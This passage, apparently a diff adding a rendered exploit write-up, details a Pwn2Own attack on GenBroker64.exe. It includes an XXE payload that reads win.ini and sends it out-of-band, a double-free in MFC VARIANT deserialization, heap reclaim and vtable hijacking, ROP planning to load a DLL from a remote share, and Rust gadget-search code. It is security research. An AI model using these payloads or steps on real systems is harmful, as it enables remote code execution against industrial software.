+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SUCCEEDED</span><span class="p">(</span><span class="n">Hr</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;SUCCESS %s!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">Key</span><span class="p">);</span>
+<span class="w">    </span><span class="c1">// - Content of xxe.dtd:</span>
+<span class="w">    </span><span class="c1">// ```</span>
+<span class="w">    </span><span class="c1">// &lt;!ENTITY % payload SYSTEM &quot;file:///C:/windows/win.ini&quot;&gt;</span>
+<span class="w">    </span><span class="c1">// &lt;!ENTITY % root &quot;&lt;!ENTITY &amp;#x25; oob SYSTEM &#39;http://localhost:8000/file?%payload;&#39;&gt;&quot;&gt;</span>
+<span class="w">    </span><span class="c1">// %root;</span>
+<span class="w">    </span><span class="c1">// %oob;</span>
+<span class="w">    </span><span class="c1">// ```</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">S</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">R</span><span class="s">&quot;</span><span class="dl">(</span><span class="s">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="s">&lt;!DOCTYPE malicious [</span>
+<span class="s">  &lt;!ENTITY % sp SYSTEM &quot;http://localhost:8000/xxe.dtd&quot;&gt;</span>
+<span class="s">%sp;&amp;root;</span>
+<span class="s">]&gt;)</span><span class="dl">)</span><span class="s">&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">IStream</span><span class="w"> </span><span class="o">*</span><span class="n">Stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SHCreateMemStream</span><span class="p">((</span><span class="k">const</span><span class="w"> </span><span class="n">BYTE</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">S</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">S</span><span class="p">));</span>
+<span class="w">    </span><span class="n">PersistStream</span><span class="o">-&gt;</span><span class="n">Load</span><span class="p">(</span><span class="n">Stream</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Stream</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">PersistStream</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">PersistStream</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">Unknown</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">Return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>And this is what it looks like:</p>
+<p><center><img src="/images/paracosme/xxe.png" /></center></p>
+<p>Once more time, it felt good and like progress, but realistically, it didn't get me closer from demonstrating remote code execution against the target 😒 Back to the grind.</p>
+<p>At this point, I had been playing with COM thing for a minute but I had missed something big. I was messing around an afternoon with various COM objects exploring new ways and a use-after-free crash happened 😮</p>
+<div class="highlight"><pre><span></span><code>First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+OLEAUT32!VarWeekdayName+0x22468:
+00007ffa`e620c7f8 488b01          mov     rax,qword ptr [rcx] ds:00000000`2e5a2fd0=????????????????
+</code></pre></div>
+
+
+<p>What the hell I thought? I tried it again.. and it happened again.</p>
+<h2 id="understanding-the-bug">Understanding the bug</h2>
+<p>After looking at the code closer I started to understand what was happening. If we look back at the <code>operator&gt;&gt;</code>'s code, we can see that if the <code>Load()</code> method call throws an exception, it is caught so that it is able to <code>Release()</code> both <code>pPersistStream</code> &amp; <code>pSrc-&gt;punkVal</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="n">CArchive</span><span class="o">&amp;</span><span class="w"> </span><span class="n">AFXAPI</span><span class="w"> </span><span class="k">operator</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">CArchive</span><span class="o">&amp;</span><span class="w"> </span><span class="n">ar</span><span class="p">,</span><span class="w"> </span><span class="n">COleVariant</span><span class="o">&amp;</span><span class="w"> </span><span class="n">varSrc</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">LPVARIANT</span><span class="w"> </span><span class="n">pSrc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">varSrc</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ar</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="p">;</span>
+
+<span class="c1">// ...</span>
+<span class="w">  </span><span class="k">switch</span><span class="p">(</span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="c1">// ...</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_DISPATCH</span><span class="p">:</span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="no">VT_UNKNOWN</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">LPPERSISTSTREAM</span><span class="w"> </span><span class="n">pPersistStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">      </span><span class="n">CArchiveStream</span><span class="w"> </span><span class="nf">stm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span>
+<span class="c1">// ...</span>
+<span class="w">      </span><span class="n">SCODE</span><span class="w"> </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">clsid</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">        </span><span class="n">CLSCTX_ALL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CLSCTX_REMOTE_SERVER</span><span class="p">,</span>
+<span class="w">        </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">vt</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">VT_UNKNOWN</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">IID_IUnknown</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">IID_IDispatch</span><span class="p">,</span>
+<span class="w">        </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="p">);</span>
+<span class="c1">// ...</span>
+<span class="w">      </span><span class="n">TRY</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="o">-&gt;</span><span class="n">QueryInterface</span><span class="p">(</span>
+<span class="w">          </span><span class="n">IID_IPersistStream</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pPersistStream</span><span class="p">);</span>
+<span class="c1">// ...</span>
+<span class="w">        </span><span class="n">AfxCheckError</span><span class="p">(</span><span class="n">pPersistStream</span><span class="o">-&gt;</span><span class="n">Load</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stm</span><span class="p">));</span>
+<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="n">CATCH_ALL</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">pPersistStream</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">pPersistStream</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">pSrc</span><span class="o">-&gt;</span><span class="n">punkVal</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
+<span class="w">        </span><span class="n">THROW_LAST</span><span class="p">();</span>
+<span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+
+
+<p>The interesting detail though is that the pointer to the instantiated COM object has been written into <code>pSrc</code> which is a reference to a VARIANT object by the caller. Why does this matter? Well, if you remember <code>Utils::ReadVariant</code> also will catch the exception and will clear the <code>Variant</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">Utils::ReadVariant</span><span class="p">(</span><span class="n">tagVARIANT</span><span class="w"> </span><span class="o">*</span><span class="n">Variant</span><span class="p">,</span><span class="w"> </span><span class="n">Archive_t</span><span class="w"> </span><span class="o">*</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">Level</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">TRY</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">ReadVariant_</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">COleVariant</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Variant</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="n">CATCH_ALL</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">VariantClear</span><span class="p">(</span><span class="n">Variant</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>But because <code>Variant</code> has been modified by <code>operator&gt;&gt;</code>, <a href="https://learn.microsoft.com/en-us/windows/win32/api/oleauto/nf-oleauto-variantclear">VariantClear</a> thinks it needs to free up the COM instance pointer that is held in the variant leading to a double free... 🔥! This issue was hiding in plain sight and it is made easier to see by the fact that IDA (still?) doesn't have good support for exception handling in the the <a href="https://hex-rays.com/">Hex-Rays</a> decompiler.</p>
+<p><center><img src="/images/paracosme/decomp.png" /></center></p>
+<p>This bug is interesting because based on my understanding, it really feels like the MFC <code>operator&gt;&gt;</code> could protect callers of such bugs by NULL'ing out <code>pSrc-&gt;punkVal</code> after releasing it. Or modify <code>pSrc</code> only when the function is done and is a success, but not before. What is problematic is that it is hard for the exception handler of <code>Utils::ReadVariant</code> to even know if <code>Variant</code> needs to be cleared or not. Who knows, maybe there are legit reasons as to why the operator works this way but I wouldn't be surprised if this bug exists in other applications 🤷🏽‍♂️. If you are interested at looking at a trigger for the issue, checkout <a href="https://github.com/0vercl0k/paracosme/blob/main/src/paracosme-poc.py">paracosme-poc.py</a>.</p>
+<p>At this point, the planets are slowing aligning and we are still in the game and there's enough time to build an exploit for this based on what I know. Before digging into the exploit engineering, let's recap what primitive do we have:
+- <code>GenBroker64.exe</code> listens by default on TCP:38080 and deserializes messages sent by the client
+- Although it tries to allow only certain VARIANT types, there is a mistake in the way it is implemented. If the user sends a <code>VT_EMPTY</code> VARIANT, the fallback code invokes the MFC <code>operator&gt;&gt;</code> which will read a VARIANT off the stream. When invoked, <code>GenBroker64.exe</code> doesn't rewind the bytes it read as the VARIANT type, which means the next two bytes will be interpreted by the <code>operator&gt;&gt;</code> as the VARIANT type. This allows us to bypass the allow list and have the MFC instantiate an arbitrary COM object for us.
+- If the COM object throws an exception while either the <code>QueryInterface</code> or <code>Load</code> method is called, there will be a double-free of the instantiated COM object. The second free is done by <a href="https://learn.microsoft.com/en-us/windows/win32/api/oleauto/nf-oleauto-variantclear">VariantClear</a> which will internally call the object's virtual <code>Release</code> method.</p>
+<p>What this means is if we can reclaim the freed memory after the first free, but before the <a href="https://learn.microsoft.com/en-us/windows/win32/api/oleauto/nf-oleauto-variantclear">VariantClear</a>, then we can control a vtable pointer and as a result get control over the execution 💥.</p>
+<p>It is now time to engineer planet alignments.</p>
+<h2 id="can-i-reclaim-the-chunk-with-controlled-data">Can I reclaim the chunk with controlled data?</h2>
+<p>The first three crucial questions I had were:</p>
+<ol>
+<li>Can I run multiple clients at the same time that I can use to reclaim the memory chunk?</li>
+<li>Is there any behavior in the heap allocator that will prevent another thread to reclaim the target chunk that I need to reclaim?</li>
+<li>Can I find a way to reclaim the chunk and populate it with controlled data?</li>
+</ol>
+<p>To answer the first two questions, I simply instrumented <code>GenBroker64.exe</code> with a debugger to verify that I could execute other client while the target thread was frozen. While doing so I also verified that the freed chunk could be reclaimed by a different thread when the target thread is frozen right after the first free.</p>
+<p>The third question was a bit more work because I needed a way to trigger an allocation in the same heap with controlled content. I first looked into the angle of leveraging another COM object that would let me control partially the reclaimed chunk with arbitrary content via the <code>Load</code> method. I modified the tooling I had written before to try to enumerate and find good candidates but I ended up walking away from it. A lot of COM objects used a different allocator or were allocating off a different heap, and I never really found one that allowed me to control as much as I wanted of the reclaimed chunk.</p>
+<p>Then, I looked into using another message type that would let me control the allocation size and its content. I ended up chosing the message with the id <code>0x7d0</code> which basically allowed the allocation of a chunk of memory of an arbitrary size and to control its entire content. The message basically builds an array of 32-bit integers and this is what its deserialization look like:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="kr">__fastcall</span><span class="w"> </span><span class="n">PayloadReq7D0_t</span><span class="o">::</span><span class="n">ReadFromArchive</span><span class="p">(</span><span class="n">PayloadReq7D0_t</span><span class="w"> </span><span class="o">*</span><span class="n">Payload</span><span class="p">,</span><span class="w"> </span><span class="n">Archive_t</span><span class="w"> </span><span class="o">*</span><span class="n">Archive</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="c1">// ...</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="n">Archive</span><span class="o">-&gt;</span><span class="n">m_nMode</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">ArchiveReadMode</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">)</span>
+<span class="w">  </span><span class="p">{</span>
+<span class="w">    </span><span class="n">Archive</span><span class="o">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Payload</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="o">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">ProgId</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="o">::</span><span class="n">ReadString</span><span class="p">((</span><span class="n">CArchive</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">CString</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">StringC</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="o">::</span><span class="n">ReadUint32_</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">qword18</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Archive</span><span class="o">::</span><span class="n">ReadUint32_</span><span class="p">(</span><span class="n">Archive</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">BufferSize</span><span class="p">);</span>
+<span class="w">    </span><span class="n">BufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">BufferSize</span><span class="p">;</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">BufferSize</span><span class="w"> </span><span class="p">)</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="n">Buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="n">BufferSize</span><span class="p">,</span><span class="w"> </span><span class="mi">4u</span><span class="n">i64</span><span class="p">);</span>
+<span class="w">      </span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Buffer</span><span class="p">;</span>
+<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Buffer</span><span class="w"> </span><span class="p">)</span>
+<span class="w">      </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">i64</span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">BufferSize</span><span class="p">;</span><span class="w"> </span><span class="n">Archive</span><span class="o">-&gt;</span><span class="n">m_lpBufCur</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="p">{</span>
+<span class="w">          </span><span class="n">Entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Payload</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="c1">// ...</span>
+<span class="w">          </span><span class="o">*</span><span class="n">Entry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">m_lpBufCur</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="c1">// ...</span>
+</code></pre></div>
+
+
+<h2 id="hijacking-control-flow-roping-to-get-arbitrary-native-code-execution">Hijacking control flow &amp; ROPing to get arbitrary native code execution</h2>
+<p>Hijacking control flow from here was pretty straight-forward. As I mentioned above, <code>VariantClear</code> reads the first 8 bytes of the chunk as a virtual table for the object. Then, it reads from this virtual table at a specific offset, and dispatches a call there. If this isn't clear, this is what it looks like in assembly where <code>@rcx</code> points to the heap chunk we reclaimed with arbitrary content:</p>
+<div class="highlight"><pre><span></span><code>0:011&gt; u . l3
+OLEAUT32!VariantClear+0x20b:
+00007ffb`0df751cb  mov     rax,qword ptr [rcx]
+00007ffb`0df751ce  mov     rax,qword ptr [rax+10h]
+00007ffb`0df751d2  call    qword ptr [00007ffb`0df82660]
+
+0:011&gt; u poi(00007ffb`0df82660)
+OLEAUT32!SetErrorInfo+0xec0:
+00007ffb`0deffd40  jmp     rax
+</code></pre></div>
+
+
+<p>The first instruction reads the virtual table address in <code>@rax</code>, then the <code>Release</code> method address is read at offset <code>0x10</code> from this virtual table in <code>@rax</code>, and finally <code>Release</code> is called by dispatching an indirect call to <code>@rax</code>. If this is not clear, imagine that the below is the content of the reclaimed heap chunk:</p>
+<div class="highlight"><pre><span></span><code>0x11111111&#39;11111111
+0x22222222&#39;22222222
+0x33333333&#39;33333333
+</code></pre></div>
+
+
+<p>Execution will be redirected to <code>[[0x11111111'11111111] + 0x10]</code> which means:</p>
+<ol>
+<li><code>0x11111111'11111111</code> needs to be an address that points somewhere readable in the address space to not crash,</li>
+<li>But it also needs to be pointing to another address (to which is added the offset <code>0x10</code>) that will point to where we want to pivot execution to.</li>
+</ol>
+<p>So yes, this is a bit annoying; we basically have a constrained <code>call</code> primitive. The other important piece that surfaces is ASLR. Fortunately for us the main module <code>GenBroker64.exe</code> doesn't have ASLR but every other modules does (technically it is not true, <code>GenClient64.dll</code> also didn't have ASLR but it seemed to have even less code / interesting gadgets so I ditched it mostly). In other words, we can only reuse gadgets from <code>GenBroker64.exe</code> and nowhere else because we do not have a way to leak information about the address space of the target. Another tricky bit is that the chunk that we reclaim is <code>0xc0</code> bytes long which gives us at most space for a ROP chain made of <code>0xc0 / 8 = 24</code> addresses.</p>
+<p>OK well, let's try to solve problems one by one. What do we need from our ROP chain? The ROP chain needs to be able to demonstrate arbitrary code execution which means that ideally we would like to pop a shell. Because of ASLR, we don't know where <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a> or similar functions are in memory. The only thing we can possibly do is to reuse the function that <code>GenBroker64.exe</code> imports. This is possible because the <a href="">Import Address Table</a> will be at an hardcoded location and in there will be ASLR'd addresses to where the APIs are. Unfortunately, <code>GenBroker64.exe</code> didn't import very exciting functions as you can see:</p>
+<p><center><img src="/images/paracosme/import.png" /></center></p>
+<p>The only obvious one that did stand out was <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexw">LoadLibraryExW</a> which allows to load a DLL hosted on a remote WebDAV or SMB share. This is cool, but it also means we need to use part of the reclaimed buffer to store a UTF-16 string of the form <code>\\192.168.1.1\x\a.dll\x00</code> which is about 44 bytes. This means we now have <code>(0xc0 - 44) / 8 = 148 / 8 = 18</code> slots for the entire ROP chain. It is starting to feel pretty tight for being able to call arbitrary code, and prepare the CPU context to invoke <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexw">LoadLibraryExW</a> with our controlled string. We'll figure it out once we get there I told myself.</p>
+<p>At this point, the question becomes how the hell do we find a way to boost the constrained call primitive to an unconstrained call primitive? We need to find a chain of pointers such that we are able to call an arbitrary gadget. We can then worry about pivoting the stack somewhere we control to kick off the rest of our ROP chain.</p>
+<p>Looking for that magic gadget was painful. I started doing it manually and focusing on virtual tables. I focused on virtual tables because they basically are data which contains pointers to code which is what we need. But we also need the function pointer to point to a piece of code that will let us control the target of another indirect call. After hours and hours of prototyping, search, thinking outside the box I started to lose hope a little bit. It felt lonely, so far from the grail but at the same time it felt so close 😢.</p>
+<p>I switched gears and decided to write a bruteforce tool. I would grab a crash-dump at the time I hijack control flow and I would try to replace the virtual address table pointer by every addresses that were part of <code>GenBroker64.exe</code>. I would let the emulator starts execution and catch crashes. When a crash occurs, I can check post conditions such as 'Does RIP have a value that looks like a controlled value'? I initially wrote this as a quick &amp; dirty script but recently rewrote it in Rust as a learning exercise. The pre condition basically injects the address right at the virtual table address slot in the heap chunk we reclaimed with arbitrary content:</p>
+<div class="highlight"><pre><span></span><code><span class="k">impl</span><span class="w"> </span><span class="n">Finder</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Pwn2OwnMiami2022_1</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">fn</span> <span class="nf">pre</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">emu</span>: <span class="kp">&amp;</span><span class="nc">mut</span><span class="w"> </span><span class="n">Emu</span><span class="p">,</span><span class="w"> </span><span class="n">candidate</span>: <span class="kt">u64</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="c1">// (1574.be0): Access violation - code c0000005 (first/second chance not available)</span>
+<span class="w">        </span><span class="c1">// For analysis of this file, run !analyze -v</span>
+<span class="w">        </span><span class="c1">// oleaut32!VariantClearWorker+0xff:</span>
+<span class="w">        </span><span class="c1">// 00007ffb`3a3dc7fb 488b4010        mov     rax,qword ptr [rax+10h] ds:deadbeef`baadc0ee=????????????????</span>
+<span class="w">        </span><span class="c1">//</span>
+<span class="w">        </span><span class="c1">// 0:011&gt; u . l3</span>
+<span class="w">        </span><span class="c1">// oleaut32!VariantClearWorker+0xff:</span>
+<span class="w">        </span><span class="c1">// 00007ffb`3a3dc7fb 488b4010        mov     rax,qword ptr [rax+10h]</span>
+<span class="w">        </span><span class="c1">// 00007ffb`3a3dc7ff ff15c3ce0000    call    qword ptr [oleaut32!_guard_dispatch_icall_fptr (00007ffb`3a3e96c8)]</span>
+<span class="w">        </span><span class="c1">//</span>
+<span class="w">        </span><span class="c1">// 0:011&gt; u poi(00007ffb`3a3e96c8)</span>
+<span class="w">        </span><span class="c1">// oleaut32!guard_dispatch_icall_nop:</span>
+<span class="w">        </span><span class="c1">// 00007ffb`3a36e280 ffe0            jmp     rax</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">rcx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">emu</span><span class="p">.</span><span class="n">rcx</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// Rewind to the instruction right before the crash:</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="c1">// 0:011&gt; ub .</span>
+<span class="w">        </span><span class="c1">// oleaut32!VariantClearWorker+0xe6:</span>
+<span class="w">        </span><span class="c1">// ...</span>
+<span class="w">        </span><span class="c1">// 00007ffb`3a3dc7f8 488b01          mov     rax,qword ptr [rcx]</span>
+<span class="w">        </span><span class="c1">// ```</span>
+<span class="w">        </span><span class="n">emu</span><span class="p">.</span><span class="n">set_rip</span><span class="p">(</span><span class="mh">0x00007ffb_3a3dc7f8</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// Overwrite the buffer we control with the `MARKER_PAGE_ADDR`. The first qword</span>
+<span class="w">        </span><span class="c1">// is used to hijack control flow, so this is where we write the candidate</span>
+<span class="w">        </span><span class="c1">// address.</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">18</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">std</span>::<span class="n">mem</span>::<span class="n">size_of</span>::<span class="o">&lt;</span><span class="kt">u64</span><span class="o">&gt;</span><span class="p">();</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">;</span>
+<span class="w">            </span><span class="kd">let</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">qword</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">candidate</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">MARKER_PAGE_ADDR</span><span class="p">.</span><span class="kt">u64</span><span class="p">()</span>
+<span class="w">            </span><span class="p">};</span>
+
+<span class="w">            </span><span class="n">emu</span><span class="p">.</span><span class="n">virt_write</span><span class="p">(</span><span class="n">Gva</span>::<span class="n">new</span><span class="p">(</span><span class="n">rcx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">idx</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">value</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="nb">Ok</span><span class="p">(())</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">fn</span> <span class="nf">post</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">emu</span>: <span class="kp">&amp;</span><span class="nc">Emu</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="c1">// ...</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>And here are the post conditions that basically looks for a tainted RIP:</p>
+<div class="highlight"><pre><span></span><code><span class="k">impl</span><span class="w"> </span><span class="n">Finder</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Pwn2OwnMiami2022_1</span><span class="w"> </span><span class="p">{</span>
